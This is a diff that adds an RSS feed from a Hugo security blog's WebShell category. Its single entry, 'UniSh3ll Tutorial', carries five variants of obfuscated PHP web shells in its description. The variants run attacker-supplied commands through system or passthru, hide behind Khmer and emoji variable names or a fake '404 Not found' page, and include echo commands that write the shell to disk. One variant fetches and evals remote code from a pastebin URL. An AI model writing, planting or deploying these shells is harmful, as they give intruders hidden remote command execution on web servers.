@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>WebShell on ពុទ្ធិលេប | ThikLab</title>
+    <link>https://thiklab.com/categories/webshell/</link>
+    <description>Recent content in WebShell on ពុទ្ធិលេប | ThikLab</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklab@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklab@gmail.com (Thik)</webMaster>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Tue, 26 May 2020 14:28:44 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/categories/webshell/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>UniSh3ll Tutorial</title>
+        <link>https://thiklab.com/posts/unishell/</link>
+        <pubDate>Tue, 26 May 2020 14:28:44 +0700</pubDate>
+        <author>thiklab@gmail.com (Thik)</author>
+        <atom:modified>Tue, 26 May 2020 14:28:44 +0700</atom:modified>
+        <guid>https://thiklab.com/posts/unishell/</guid>
+        <description>USh3ll-I 1  &amp;lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system&amp;amp;0=id;ls+-la    USh3ll-II 1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;&amp;#34; &amp;gt; uni.php   1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;\r&amp;lt;?=&amp;#39;404 Not found&amp;#39;;?&amp;gt;&amp;#34; &amp;gt; uni.php   Usage: curl localhost/uni.php -d _=ls+-la
+USh3ll-III 1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); //.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=ls    1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); eval(&amp;#39;?&amp;gt;&amp;#39;.file_get_contents($ា[ដ]));?&amp;gt;    Usage: uni.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=id&amp;amp;ដ=https://pastebin.com/raw/JfLvh0MG
+USh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$b; $c(&amp;#34;uname -a&amp;#34;); //get method    USh3ll-V 1  &amp;lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v &amp;#39;127.0.0.1:8080/uni.php?0=system&amp;amp;1=la+-la&amp;#39;    </description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>php</category>
+            
+          
+        
+        
+          
+            
+              <category>WebShell</category>
+            
+          
+        
+        
+          
+            
+              <category>WebApp</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
